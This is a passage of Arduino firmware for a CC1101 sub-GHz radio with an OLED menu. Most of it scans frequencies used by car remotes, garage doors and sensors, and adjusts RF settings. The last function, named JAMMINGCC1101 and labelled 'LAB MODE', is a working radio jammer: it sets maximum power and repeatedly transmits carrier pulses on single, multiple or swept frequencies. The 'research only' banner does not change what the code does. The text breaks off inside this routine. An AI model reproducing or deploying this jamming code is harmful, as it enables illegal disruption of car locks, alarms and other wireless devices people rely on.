
void drawHistogram() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_5x7_tr);

  char hdr[30];
  sprintf(hdr, "HIST %.2fMHz", currentFreq);
  u8g2.drawStr(0, 7, hdr);

  float span = 1.0;
  float startF = currentFreq - span / 2.0;
  float step = span / 64.0;

  int x = 0;
  for (int i = 0; i < 64; i++) {
    float f = startF + i * step;
    ELECHOUSE_cc1101.setMHZ(f);
    ELECHOUSE_cc1101.SetRx();
    safeDelay(5);

    int rssi = ELECHOUSE_cc1101.getRssi();
    int barH = map(rssi, -110, -30, 0, 54);
    if (barH < 0) barH = 0;
    if (barH > 54) barH = 54;

    u8g2.drawBox(x, 63 - barH, 2, barH);
    x += 2;
  }

  ELECHOUSE_cc1101.setMHZ(currentFreq);
  ELECHOUSE_cc1101.SetRx();
  u8g2.sendBuffer();

  if (isButtonPressed(BTN_BACK)) {
    mode = -1;
  }
}








//////////////////////////////////////
//////////////////////////////////
void SPECTRUMANALYZER() {
 
    static const int NUM_RECENT_FREQS = 10;
    static const int SIGNAL_HOLD_TIME = 3000;  
    static const int STRONG_SIGNAL_THRESHOLD = -60;  
    static const int WEAK_SIGNAL_THRESHOLD = -85;  
    static const int HOP_SPEED = 200;  
    
    static float freq_history[10] = {0};
    static int rssi_history[10] = {-120, -120, -120, -120, -120, -120, -120, -120, -120, -120};
    static unsigned long signalFoundTime = 0;
    static bool signalLocked = false;
    static float freq_active = 0.0;
    static int rssi_active = -120;
    static float locked_freq = 0.0;
    static int locked_rssi = -120;
    
    
    static unsigned long lastScanTime = 0;
    static unsigned long lastHopTime = 0;
    static int currentHopIndex = 0;
    
    // أشهر الترددات المستخدمة في العالم
    static const float POPULAR_FREQS[] = {
        433.92,  // ISM Band - الأشهر عالمياً (ريموتات، سنسورات)
        315.0,   // أمريكا الشمالية - ريموتات السيارات
        868.0,   // أوروبا ISM
        433.0,   // Garage doors عالمياً
        434.0,   // Car keys أوروبا
        915.0,   // أمريكا ISM
        390.0,   // Car remotes آسيا
        303.875, // Wireless doorbells
        418.0,   // Medical devices
        310.0,   // Car alarms
        330.0,   // Tire sensors
        345.0    // Weather stations
    };
    static const int NUM_POPULAR_FREQS = 12;
    
    // الأيقونات
    static const unsigned char image_arrow_right_bits[] U8X8_PROGMEM = {0x10,0x20,0x7f,0x20,0x10};
    static const unsigned char image_network_1_bar_bits[] U8X8_PROGMEM = {0x00,0x70,0x00,0x50,0x00,0x50,0x00,0x50,0x00,0x57,0x00,0x55,0x00,0x55,0x00,0x55,0x70,0x55,0x50,0x55,0x50,0x55,0x50,0x55,0x57,0x55,0x57,0x55,0x77,0x77,0x00,0x00};
    static const unsigned char image_network_1_bits[] U8X8_PROGMEM = {0x00,0x70,0x00,0x50,0x00,0x50,0x00,0x50,0x00,0x57,0x00,0x55,0x00,0x55,0x00,0x55,0x70,0x55,0x50,0x55,0x50,0x55,0x50,0x55,0x57,0x55,0x55,0x55,0x77,0x77,0x00,0x00};
    static const unsigned char image_network_2_bars_bits[] U8X8_PROGMEM = {0x00,0x70,0x00,0x50,0x00,0x50,0x00,0x50,0x00,0x57,0x00,0x55,0x00,0x55,0x00,0x55,0x70,0x55,0x70,0x55,0x70,0x55,0x70,0x55,0x77,0x55,0x77,0x55,0x77,0x77,0x00,0x00};
    static const unsigned char image_network_3_bars_bits[] U8X8_PROGMEM = {0x00,0x70,0x00,0x50,0x00,0x50,0x00,0x50,0x00,0x57,0x00,0x57,0x00,0x57,0x00,0x57,0x70,0x57,0x70,0x57,0x70,0x57,0x70,0x57,0x77,0x57,0x77,0x57,0x77,0x77,0x00,0x00};
    static const unsigned char image_network_4_bars_bits[] U8X8_PROGMEM = {0x00,0x70,0x00,0x70,0x00,0x70,0x00,0x70,0x00,0x77,0x00,0x77,0x00,0x77,0x00,0x77,0x70,0x77,0x70,0x77,0x70,0x77,0x70,0x77,0x77,0x77,0x77,0x77,0x77,0x77,0x00,0x00};
    
  
    if (millis() - lastHopTime > HOP_SPEED) {
        lastHopTime = millis();
        
       
        float hopFreq = POPULAR_FREQS[currentHopIndex];
        
        
        ELECHOUSE_cc1101.setMHZ(hopFreq);
        ELECHOUSE_cc1101.SetRx();
        delay(5);
        
        
        int currentRssi = ELECHOUSE_cc1101.getRssi();
        
        
        Serial.print("[HOP] Freq: ");
        Serial.print(hopFreq, 2);
        Serial.print(" MHz | RSSI: ");
        Serial.print(currentRssi);
        Serial.print(" dBm");
        
        
        if (currentRssi > STRONG_SIGNAL_THRESHOLD) {
            Serial.println(" << STRONG SIGNAL DETECTED!");
            
            bool updated = false;
            
            
            for (int i = 0; i < NUM_RECENT_FREQS; i++) {
                if (freq_history[i] > 0 && abs(freq_history[i] - hopFreq) < 1.0) {
                    if (currentRssi > rssi_history[i]) {
                        freq_history[i] = hopFreq;
                        rssi_history[i] = currentRssi;
                    }
                    updated = true;
                    break;
                }
            }
            
           
            if (!updated) {
                int weakestIdx = 0;
                int weakestRssi = rssi_history[0];
                
                for (int i = 1; i < NUM_RECENT_FREQS; i++) {
                    if (rssi_history[i] < weakestRssi) {
                        weakestRssi = rssi_history[i];
                        weakestIdx = i;
                    }
                }
                
                if (currentRssi > weakestRssi) {
                    freq_history[weakestIdx] = hopFreq;
                    rssi_history[weakestIdx] = currentRssi;
                }
            }
        } else {
            Serial.println();
        }
        
        
        currentHopIndex++;
        if (currentHopIndex >= NUM_POPULAR_FREQS) {
            currentHopIndex = 0;
            Serial.println("========== HOP CYCLE COMPLETE ==========");
        }
    }
    
    
    int maxRssiIdx = -1;
    int maxRssi = -120;
    
    for (int i = 0; i < NUM_RECENT_FREQS; i++) {
        if (freq_history[i] > 0 && rssi_history[i] > maxRssi && rssi_history[i] > STRONG_SIGNAL_THRESHOLD) {
            maxRssi = rssi_history[i];
            maxRssiIdx = i;
        }
    }
    
    
    if (!signalLocked) {
       
        if (maxRssiIdx >= 0 && maxRssi > STRONG_SIGNAL_THRESHOLD) {
            signalLocked = true;
            signalFoundTime = millis();
            locked_freq = freq_history[maxRssiIdx];
            locked_rssi = maxRssi;
            
            
            Serial.println();
            Serial.println("╔════════════════════════════════════╗");
            Serial.print("║ SIGNAL LOCKED: ");
            Serial.print(locked_freq, 2);
            Serial.println(" MHz      ║");
            Serial.print("║ RSSI: ");
            Serial.print(locked_rssi);
            Serial.println(" dBm                    ║");
            Serial.println("╚════════════════════════════════════╝");
            Serial.println();
            
            
            ELECHOUSE_cc1101.setMHZ(locked_freq);
            ELECHOUSE_cc1101.SetRx();
            
            freq_active = locked_freq;
            rssi_active = locked_rssi;
        } else {
            
            freq_active = 0.0;
            rssi_active = -120;
        }
    } else {
        
        delay(5);
        int currentRssi = ELECHOUSE_cc1101.getRssi();
        
       
        if (millis() % 500 < 50) {  
            Serial.print("[LOCKED] Monitoring ");
            Serial.print(locked_freq, 2);
            Serial.print(" MHz | Current RSSI: ");
            Serial.print(currentRssi);
            Serial.println(" dBm");
        }
        
       
        if (currentRssi > WEAK_SIGNAL_THRESHOLD) {
            locked_rssi = currentRssi;
            rssi_active = currentRssi;
            signalFoundTime = millis();
        }
        
        
        if (millis() - signalFoundTime > SIGNAL_HOLD_TIME || locked_rssi < WEAK_SIGNAL_THRESHOLD) {
            signalLocked = false;
            
           
            Serial.println();
            Serial.println("▼▼▼ SIGNAL LOST - UNLOCKING ▼▼▼");
            Serial.println("Returning to hopping mode...");
            Serial.println();
            
           
            for (int i = 0; i < NUM_RECENT_FREQS; i++) {
                freq_history[i] = 0.0;
                rssi_history[i] = -120;
            }
            
            freq_active = 0.0;
            rssi_active = -120;
            locked_freq = 0.0;
            locked_rssi = -120;
        } else {
            freq_active = locked_freq;
            rssi_active = locked_rssi;
        }
    }
    
    
    int network_level = 0;
    if (rssi_active > -40) network_level = 4;
    else if (rssi_active > -55) network_level = 3;
    else if (rssi_active > -70) network_level = 2;
    else if (rssi_active > -85) network_level = 1;
    
    
    u8g2.clearBuffer();
    u8g2.setFontMode(1);
    u8g2.setBitmapMode(1);
    
    
    u8g2.setFont(u8g2_font_4x6_tr);
    if (signalLocked) {
        u8g2.drawStr(20, 8, "frequency analyzer [LOCK]");
    } else {
        
        char hopMsg[30];
        sprintf(hopMsg, "freq analyzer [HOP:%d/%d]", currentHopIndex + 1, NUM_POPULAR_FREQS);
        u8g2.drawStr(10, 8, hopMsg);
    }
    
    
    u8g2.setFont(u8g2_font_profont17_tr);
    char freqStr[16];
    if (freq_active > 0.1) {
        int freq_int = (int)freq_active;
        int freq_dec = (int)((freq_active - freq_int) * 1000);
        sprintf(freqStr, "%03d.%03d", freq_int, freq_dec);
    } else {
        strcpy(freqStr, "000.000");
    }
    u8g2.drawStr(19, 25, freqStr);
    
    
    u8g2.setFont(u8g2_font_profont12_tr);
    u8g2.drawStr(90, 24, "MHZ");
    
    
    u8g2.setFont(u8g2_font_profont10_tr);
    char rssiStr[10];
    if (freq_active > 0.1) {
        sprintf(rssiStr, "RS:%d", rssi_active);
    } else {
        strcpy(rssiStr, "RS:---");
    }
    u8g2.drawStr(4, 58, rssiStr);
    
    
    if (network_level == 4) {
        u8g2.drawXBMP(25, 42, 15, 16, image_network_4_bars_bits);
    } else if (network_level == 3) {
        u8g2.drawXBMP(25, 41, 15, 16, image_network_3_bars_bits);
    } else if (network_level == 2) {
        u8g2.drawXBMP(25, 40, 15, 16, image_network_2_bars_bits);
    } else if (network_level == 1) {
        u8g2.drawXBMP(25, 42, 15, 16, image_network_1_bar_bits);
    } else {
        u8g2.drawXBMP(25, 42, 15, 16, image_network_1_bits);
    }
    
    
    u8g2.drawXBMP(49, 34, 7, 5, image_arrow_right_bits);
    u8g2.drawXBMP(49, 45, 7, 5, image_arrow_right_bits);
    u8g2.drawXBMP(49, 56, 7, 5, image_arrow_right_bits);
    
    
    if (!signalLocked) {
        u8g2.setFont(u8g2_font_profont10_tr);
        int displayCount = 0;
        for (int i = 0; i < NUM_RECENT_FREQS && displayCount < 3; i++) {
            if ((maxRssiIdx < 0 || i != maxRssiIdx) && freq_history[i] > 0 && rssi_history[i] > STRONG_SIGNAL_THRESHOLD) {
                char lastFreq[20];
                int f_int = (int)freq_history[i];
                int f_dec = (int)((freq_history[i] - f_int) * 100);
                sprintf(lastFreq, "%d.%02d/%d", f_int, f_dec, rssi_history[i]);
                u8g2.drawStr(60, 39 + (displayCount * 11), lastFreq);
                displayCount++;
            }
        }
    }
    
    u8g2.sendBuffer();
}


////////////////////////////////////////////



void drawSettingsMenu() {
  const char* modNames[] = {"ASK/OOK", "2-FSK", "GFSK", "MSK"};
  
  
  const float presetFreqs[] = {
    300.00, 303.87, 304.25, 310.00, 315.00, 318.00,  // US frequencies
    390.00, 418.00, 433.05, 433.42, 433.92, 434.42, 434.77,  // EU 433 band
    868.35, 868.95, 915.00, 925.00  // ISM bands
  };
  const int numPresets = sizeof(presetFreqs) / sizeof(presetFreqs[0]);
  
  static int freqPresetIndex = -1; // -1 = custom frequency
  static bool hoppingEnabled = false;
  static unsigned long lastHopTime = 0;
  static int currentHopIndex = 0;
  const unsigned long HOP_INTERVAL = 100; 
  
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x12_tf);
  u8g2.drawStr(15, 10, "RF SETTINGS");

  char line[40];
  int yPos = 20;
  
  u8g2.setFont(u8g2_font_5x7_tr);
  
  
  if (settingsIndex == 0) {
    u8g2.drawFrame(0, yPos - 8, 128, 11);
    u8g2.drawStr(2, yPos, ">");
  } else {
    u8g2.drawStr(2, yPos, " ");
  }
  sprintf(line, "Mod: %s", modNames[currentMod]);
  u8g2.drawStr(10, yPos, line);
  yPos += 12;
  
  
  if (settingsIndex == 1) {
    u8g2.drawFrame(0, yPos - 8, 128, 11);
    u8g2.drawStr(2, yPos, ">");
  } else {
    u8g2.drawStr(2, yPos, " ");
  }
  
  
  if (freqPresetIndex >= 0) {
    sprintf(line, "%.2f MHz", presetFreqs[freqPresetIndex]);
  } else {
    sprintf(line, "%.2f MHz*", currentFreq);
  }
  u8g2.drawStr(10, yPos, line);
  
  
  u8g2.setFont(u8g2_font_4x6_tr);
  if (currentFreq >= 300 && currentFreq < 350) {
    u8g2.drawStr(95, yPos, "US");
  } else if (currentFreq >= 400 && currentFreq < 450) {
    u8g2.drawStr(95, yPos, "EU433");
  } else if (currentFreq >= 850 && currentFreq < 880) {
    u8g2.drawStr(95, yPos, "EU868");
  } else if (currentFreq >= 900 && currentFreq < 928) {
    u8g2.drawStr(95, yPos, "US915");
  }
  u8g2.setFont(u8g2_font_5x7_tr);
  yPos += 12;
  
  
  if (settingsIndex == 2) {
    u8g2.drawFrame(0, yPos - 8, 128, 11);
    u8g2.drawStr(2, yPos, ">");
  } else {
    u8g2.drawStr(2, yPos, " ");
  }
  sprintf(line, "Hop: %s", hoppingEnabled ? "ON" : "OFF");
  u8g2.drawStr(10, yPos, line);
  
  if (hoppingEnabled) {
   
    sprintf(line, "[%d/%d]", currentHopIndex + 1, numPresets);
    u8g2.drawStr(90, yPos, line);
  }
  yPos += 12;
  
  
  if (settingsIndex == 3) {
    u8g2.drawFrame(0, yPos - 8, 128, 11);
    u8g2.drawStr(2, yPos, ">");
  } else {
    u8g2.drawStr(2, yPos, " ");
  }
  sprintf(line, "RXBW: %.0f kHz", rxBW);
  u8g2.drawStr(10, yPos, line);
  yPos += 12;
  
  
  if (settingsIndex == 4) {
    u8g2.drawFrame(0, yPos - 8, 128, 11);
    u8g2.drawStr(2, yPos, ">");
  } else {
    u8g2.drawStr(2, yPos, " ");
  }
  sprintf(line, "Pwr: %d dBm", powerLevel);
  u8g2.drawStr(10, yPos, line);
  
  // Power bar indicator
  int barW = map(powerLevel, -30, 10, 0, 30);
  if (barW < 0) barW = 0;
  u8g2.drawFrame(90, yPos - 6, 32, 6);
  u8g2.drawBox(91, yPos - 5, barW, 4);
  
  
  drawStatusBar();
  u8g2.sendBuffer();

  
  if (hoppingEnabled && millis() - lastHopTime > HOP_INTERVAL) {
    currentHopIndex = (currentHopIndex + 1) % numPresets;
    currentFreq = presetFreqs[currentHopIndex];
    ELECHOUSE_cc1101.setMHZ(currentFreq);
    lastHopTime = millis();
    
   
    Serial.printf("HOP [%d/%d]: %.2f MHz\r", currentHopIndex + 1, numPresets, currentFreq);
  }

  
  static int lastIndex = -1;
  
  if (isButtonPressed(BTN_DOWN)) {
    settingsIndex++;
    if (settingsIndex > 4) settingsIndex = 0;
    safeDelay(150);
  }
  if (isButtonPressed(BTN_UP)) {
    settingsIndex--;
    if (settingsIndex < 0) settingsIndex = 4;
    safeDelay(150);
  }
  
  
  if (lastIndex != settingsIndex) {
    Serial.println("\n┌─────────────────────────────────────────┐");
    Serial.println("│         RF SETTINGS MENU                │");
    Serial.println("└─────────────────────────────────────────┘");
    
    switch(settingsIndex) {
      case 0:
        Serial.println(" MODULATION SETTINGS");
        Serial.println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
        Serial.printf(" Current: %s\n", modNames[currentMod]);
        Serial.println("Available modes:");
        Serial.println("  • ASK/OOK - Amplitude Shift Keying");
        Serial.println("  • 2-FSK   - Binary Frequency Shift");
        Serial.println("  • GFSK    - Gaussian FSK");
        Serial.println("  • MSK     - Minimum Shift Keying");
        Serial.println("Press SELECT to cycle through modes");
        break;
        
      case 1:
        Serial.println(" FREQUENCY SETTINGS");
        Serial.println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
        Serial.printf(" Current: %.2f MHz %s\n", currentFreq, 
                     freqPresetIndex >= 0 ? "(Preset)" : "(Custom)");
        Serial.println("\n PRESET FREQUENCIES:");
        Serial.println("  US Band (300-318 MHz):");
        Serial.println("    300.00, 303.87, 304.25, 310.00");
        Serial.println("    315.00 - Garage doors, car remotes");
        Serial.println("    318.00");
        Serial.println("\n  EU 433 Band (390-435 MHz):");
        Serial.println("    390.00, 418.00");
        Serial.println("    433.05, 433.42, 433.92 - Remotes");
        Serial.println("    434.42, 434.77");
        Serial.println("\n  ISM Bands:");
        Serial.println("    868.35, 868.95 - EU ISM");
        Serial.println("    915.00 - US ISM");
        Serial.println("    925.00");
        Serial.println("\n  Controls:");
        Serial.println("  SELECT: Next preset");
        Serial.println("  LEFT/RIGHT: Fine tune ±0.1 MHz");
        break;
        
      case 2:
        Serial.println(" FREQUENCY HOPPING");
        Serial.println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
        Serial.printf(" Status: %s\n", hoppingEnabled ? "ENABLED" : "DISABLED");
        if (hoppingEnabled) {
          Serial.printf(" Current: [%d/%d] %.2f MHz\n", 
                       currentHopIndex + 1, numPresets, currentFreq);
          Serial.printf(" Speed: %lu ms per frequency\n", HOP_INTERVAL);
        }
        Serial.println("\n Description:");
        Serial.println("  When enabled, automatically cycles through");
        Serial.println("  all preset frequencies. Useful for:");
        Serial.println("  • Finding unknown frequencies");
        Serial.println("  • Scanning multiple bands");
        Serial.println("  • Broad spectrum monitoring");
        Serial.println("\n  Note: Disables manual frequency control");
        Serial.println("Press SELECT to toggle ON/OFF");
        break;
        
      case 3:
        Serial.println("RX BANDWIDTH SETTINGS");
        Serial.println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
        Serial.printf(" Current: %.0f kHz\n", rxBW);
        Serial.println("Available bandwidths:");
        Serial.println("  58, 68, 81, 102, 135, 203,");
        Serial.println("  325, 406, 541, 812 kHz");
        Serial.println("Note:");
        Serial.println("  • Narrower = Better selectivity");
        Serial.println("  • Wider = Better sensitivity");
        Serial.println("Press SELECT to cycle through values");
        break;
        
      case 4:
        Serial.println(" TRANSMIT POWER SETTINGS");
        Serial.println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
        Serial.printf(" Current: %d dBm\n", powerLevel);
        Serial.println("Range: -30 to +10 dBm");
        Serial.println("Typical values:");
        Serial.println("  • -30 dBm - Very low (testing)");
        Serial.println("  • -10 dBm - Low power");
        Serial.println("  •   0 dBm - Medium (1 mW)");
        Serial.println("  •  +5 dBm - High");
        Serial.println("  • +10 dBm - Maximum");
        Serial.println("  Higher power = More range but more heat");
        Serial.println("Press SELECT to increment (+1 dBm)");
        break;
    }
    Serial.println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");
    
    lastIndex = settingsIndex;
  }


  if (isButtonPressed(BTN_SELECT)) {
    Serial.println("\n╔════════════════════════════════════════╗");
    Serial.println("║       SETTING CHANGED                  ║");
    Serial.println("╚════════════════════════════════════════╝");
    
    switch(settingsIndex) {
      case 0: // Modulation
        {
          ModType oldMod = currentMod;
          currentMod = (ModType)((currentMod + 1) % 4);
          
          Serial.printf("  Modulation: %s → %s\n", modNames[oldMod], modNames[currentMod]);
          
          if (currentMod == MOD_ASK_OOK) {
            setupOOKMode();
            Serial.println("✓ Configured for ASK/OOK mode");
            Serial.println("  • Best for simple on/off signals");
            Serial.println("  • Used by most garage doors & remotes");
          } else {
            setupFSKMode();
            Serial.println("✓ Configured for FSK mode");
            Serial.println("  • Better noise immunity");
            Serial.println("  • Used for data transmission");
          }
        }
        break;
        
      case 1: 
        {
          if (!hoppingEnabled) {
            float oldFreq = currentFreq;
            freqPresetIndex++;
            if (freqPresetIndex >= numPresets) freqPresetIndex = 0;
            
            currentFreq = presetFreqs[freqPresetIndex];
            ELECHOUSE_cc1101.setMHZ(currentFreq);
            
            Serial.printf(" Frequency: %.2f → %.2f MHz\n", oldFreq, currentFreq);
            Serial.printf("✓ CC1101 tuned to %.2f MHz\n", currentFreq);
            
            
            if (currentFreq == 315.00) {
              Serial.println("   315 MHz - US Garage doors & Car remotes");
            } else if (currentFreq >= 433.00 && currentFreq <= 434.80) {
              Serial.println("   433 MHz Band - EU Remote controls");
            } else if (currentFreq >= 868.00 && currentFreq <= 869.00) {
              Serial.println("   868 MHz - EU ISM band");
            } else if (currentFreq == 915.00) {
              Serial.println("   915 MHz - US ISM band");
            } else if (currentFreq >= 300 && currentFreq < 320) {
              Serial.println("   US Sub-GHz band");
            } else if (currentFreq >= 390 && currentFreq < 440) {
              Serial.println("   EU Sub-GHz band");
            }
          } else {
            Serial.println("  Hopping is enabled - disable it first");
          }
        }
        break;
        
      case 2: 
        {
          hoppingEnabled = !hoppingEnabled;
          
          Serial.printf(" Frequency Hopping: %s\n", hoppingEnabled ? "ENABLED" : "DISABLED");
          
          if (hoppingEnabled) {
            currentHopIndex = 0;
            lastHopTime = millis();
            Serial.println("✓ Starting frequency hopping");
            Serial.printf("  • Cycling through %d frequencies\n", numPresets);
            Serial.printf("  • Interval: %lu ms\n", HOP_INTERVAL);
            Serial.println("  • Range: 300-925 MHz");
            Serial.println("\n Hopping sequence:");
            for (int i = 0; i < numPresets; i++) {
              Serial.printf("  [%2d] %.2f MHz\n", i + 1, presetFreqs[i]);
            }
          } else {
            Serial.println("✓ Frequency hopping stopped");
            Serial.printf("  • Locked at: %.2f MHz\n", currentFreq);
          }
        }
        break;
        
      case 3: // RX BW
        {
          float oldBW = rxBW;
          
          if (rxBW == 58.0) rxBW = 68.0;
          else if (rxBW == 68.0) rxBW = 81.0;
          else if (rxBW == 81.0) rxBW = 102.0;
          else if (rxBW == 102.0) rxBW = 135.0;
          else if (rxBW == 135.0) rxBW = 203.0;
          else if (rxBW == 203.0) rxBW = 325.0;
          else if (rxBW == 325.0) rxBW = 406.0;
          else if (rxBW == 406.0) rxBW = 541.0;
          else if (rxBW == 541.0) rxBW = 812.0;
          else rxBW = 58.0;
          
          ELECHOUSE_cc1101.setRxBW(rxBW);
          
          Serial.printf(" RX Bandwidth: %.0f → %.0f kHz\n", oldBW, rxBW);
          Serial.printf("✓ CC1101 RX BW set to %.0f kHz\n", rxBW);
          
          if (rxBW <= 102) {
            Serial.println("   Narrow: Good selectivity, low noise");
          } else if (rxBW <= 325) {
            Serial.println("    Medium: Balanced performance");
          } else {
            Serial.println("   Wide: High sensitivity, more noise");
          }
        }
        break;
        
      case 4: // Power
        {
          int oldPower = powerLevel;
          powerLevel++;
          if (powerLevel > 10) powerLevel = -30;
          
          ELECHOUSE_cc1101.setPA(powerLevel);
          
          Serial.printf(" TX Power: %d → %d dBm\n", oldPower, powerLevel);
          Serial.printf("✓ CC1101 PA set to %d dBm\n", powerLevel);
          
          
          float mW = pow(10.0, powerLevel / 10.0);
          Serial.printf("   Power: %.2f mW\n", mW);
          
          if (powerLevel < -20) {
            Serial.println("    Very low - Testing only");
          } else if (powerLevel < 0) {
            Serial.println("   Low - Short range");
          } else if (powerLevel <= 5) {
            Serial.println("  ✓ Medium - Good range");
          } else {
            Serial.println("   High - Maximum range (hot!)");
          }
        }
        break;
    }
    
    Serial.println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
    Serial.println("✓ Setting applied successfully");
    Serial.println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");
    
    setStatusMsg("Updated!");
    safeDelay(150);
  }
  
  
  if (isButtonPressed(BTN_LEFT)) {
    switch(settingsIndex) {
      case 1: 
        if (!hoppingEnabled) {
          currentFreq -= 0.1;
          if (currentFreq < 300.0) currentFreq = 928.0;
          ELECHOUSE_cc1101.setMHZ(currentFreq);
          freqPresetIndex = -1; // Mark as custom
          Serial.printf(" Freq: %.2f MHz (Custom)\n", currentFreq);
        }
        break;
      case 4: // Power down
        powerLevel--;
        if (powerLevel < -30) powerLevel = 10;
        ELECHOUSE_cc1101.setPA(powerLevel);
        Serial.printf(" Power: %d dBm\n", powerLevel);
        break;
    }
    safeDelay(100);
  }
  
  if (isButtonPressed(BTN_RIGHT)) {
    switch(settingsIndex) {
      case 1: // Frequency up (fine tune)
        if (!hoppingEnabled) {
          currentFreq += 0.1;
          if (currentFreq > 928.0) currentFreq = 300.0;
          ELECHOUSE_cc1101.setMHZ(currentFreq);
          freqPresetIndex = -1; // Mark as custom
          Serial.printf(" Freq: %.2f MHz (Custom)\n", currentFreq);
        }
        break;
    }
    safeDelay(100);
  }

  if (isButtonPressed(BTN_BACK)) {
    
    if (hoppingEnabled) {
      hoppingEnabled = false;
      Serial.println("\n Frequency hopping auto-disabled on exit");
    }
    
    Serial.println("\n┌─────────────────────────────────────────┐");
    Serial.println("│      CURRENT RF CONFIGURATION           │");
    Serial.println("└─────────────────────────────────────────┘");
    Serial.printf("  Modulation: %s\n", modNames[currentMod]);
    Serial.printf(" Frequency:  %.2f MHz %s\n", currentFreq, 
                 freqPresetIndex >= 0 ? "(Preset)" : "(Custom)");
    Serial.printf(" Hopping:    %s\n", hoppingEnabled ? "ON" : "OFF");
    Serial.printf(" RX BW:      %.0f kHz\n", rxBW);
    Serial.printf(" TX Power:   %d dBm (%.2f mW)\n", powerLevel, pow(10.0, powerLevel / 10.0));
    Serial.println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
    Serial.println(" Exiting Settings Menu\n");
    
    mode = -1;
  }
}




void JAMMINGCC1101() {
  static int expMode = 0; // 0=Single, 1=Range, 2=Sweep
  static bool isActive = false;
  static unsigned long experimentStart = 0;
  static float sweepFreq = 433.0;
  static int sweepDir = 1;
  static unsigned long lastUpdate = 0;
  
  u8g2.clearBuffer();
  
  // Header with icon
  u8g2.setFont(u8g2_font_7x13B_tr);
  u8g2.drawStr(25, 12, "LAB MODE");
  
  // Decorative frame
  u8g2.drawFrame(0, 0, 128, 16);
  
  const char* modeNames[] = {"Single Freq", "Multi Freq", "Freq Sweep"};
  const char* modeIcons[] = {"●", "●●●", "↔"};
  
  if (!isActive) {
   
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(20, 24, "Select Experiment:");
    
    
    u8g2.setFont(u8g2_font_6x12_tf);
    for (int i = 0; i < 3; i++) {
      int y = 35 + i * 11;
      
      if (i == expMode) {
       
        u8g2.drawRBox(2, y - 9, 124, 10, 2);
        u8g2.setDrawColor(0);
        
        // Icon
        u8g2.drawStr(6, y, modeIcons[i]);
        u8g2.drawStr(18, y, modeNames[i]);
        
        u8g2.setDrawColor(1);
      } else {
        
        u8g2.drawRFrame(2, y - 9, 124, 10, 2);
        u8g2.drawStr(6, y, modeIcons[i]);
        u8g2.drawStr(18, y, modeNames[i]);
      }
    }
    
    
    u8g2.drawHLine(0, 61, 128);
    u8g2.setFont(u8g2_font_5x7_tr);
    u8g2.drawStr(5, 63, "↑↓:Select");
    u8g2.drawStr(60, 63, "OK:Start");
    
    u8g2.sendBuffer();
    
 
    if (isButtonPressed(BTN_UP)) {
      expMode = (expMode - 1 + 3) % 3;
      safeDelay(150);
    }
    if (isButtonPressed(BTN_DOWN)) {
      expMode = (expMode + 1) % 3;
      safeDelay(150);
    }
    if (isButtonPressed(BTN_SELECT)) {
      isActive = true;
      experimentStart = millis();
      lastUpdate = millis();
      sweepFreq = 433.0;
      sweepDir = 1;
      
      // Initialize CC1101 properly
      ELECHOUSE_cc1101.Init();
      ELECHOUSE_cc1101.setMHZ(currentFreq);
      ELECHOUSE_cc1101.setModulation(2); // ASK/OOK
      ELECHOUSE_cc1101.setDRate(10); // Data rate
      ELECHOUSE_cc1101.setPA(12); // Max power
      
      Serial.println("╔════════════════════════════════════════╗");
      Serial.println("║   EXPERIMENTAL MODE STARTED            ║");
      Serial.printf("║   Mode: %-30s ║\n", modeNames[expMode]);
      Serial.println("║     USE RESPONSIBLY - RESEARCH ONLY ║");
      Serial.println("╚════════════════════════════════════════╝");
      
      safeDelay(200);
    }
    
  } else {
    
    unsigned long elapsed = (millis() - experimentStart) / 1000;
    
    // Animated header
    u8g2.setFont(u8g2_font_7x13B_tr);
    if ((millis() / 500) % 2 == 0) {
      u8g2.drawStr(20, 26, "► ACTIVE ◄");
    } else {
      u8g2.drawStr(20, 26, "▶ ACTIVE ◀");
    }
    
    
    u8g2.drawRFrame(0, 18, 128, 12, 2);
    
    
    u8g2.setFont(u8g2_font_6x10_tr);
    char info[40];
    
    sprintf(info, "Mode: %s", modeNames[expMode]);
    u8g2.drawStr(3, 38, info);
    
   
    sprintf(info, "Time: %02lu:%02lu", elapsed / 60, elapsed % 60);
    u8g2.drawStr(3, 48, info);
    
    
    int progress = (elapsed * 100) / 30;
    if (progress > 100) progress = 100;
    u8g2.drawFrame(68, 42, 58, 6);
    u8g2.drawBox(69, 43, (progress * 56) / 100, 4);
    
    
    if (millis() - lastUpdate >= 10) { 
      lastUpdate = millis();
      
      switch(expMode) {
        case 0: { 
          sprintf(info, "TX: %.2f MHz", currentFreq);
          u8g2.drawStr(3, 58, info);
          
          ELECHOUSE_cc1101.setMHZ(currentFreq);
          ELECHOUSE_cc1101.SetTx();
          
          
          pinMode(CC1101_GDO0, OUTPUT);
          for (int i = 0; i < 20; i++) {
            digitalWrite(CC1101_GDO0, HIGH);
            delayMicroseconds(100);
            digitalWrite(CC1101_GDO0, LOW);
            delayMicroseconds(100);
          }
          break;
        }
        
        case 1: { 
          const float multiFreqs[] = {433.92, 434.42, 868.30, 915.00};
          int idx = (millis() / 150) % 4;
          
          sprintf(info, "TX: %.2f MHz [%d/4]", multiFreqs[idx], idx + 1);
          u8g2.drawStr(3, 58, info);
          
          if (millis() % 150 < 10) { 
            ELECHOUSE_cc1101.setMHZ(multiFreqs[idx]);
            ELECHOUSE_cc1101.SetTx();
          }
          
          pinMode(CC1101_GDO0, OUTPUT);
          for (int i = 0; i < 15; i++) {
            digitalWrite(CC1101_GDO0, HIGH);
            delayMicroseconds(80);
            digitalWrite(CC1101_GDO0, LOW);
            delayMicroseconds(80);
          }
          break;
        }
        
        case 2: { 
          sprintf(info, "Sweep: %.2f MHz", sweepFreq);
          u8g2.drawStr(3, 58, info);
          
          
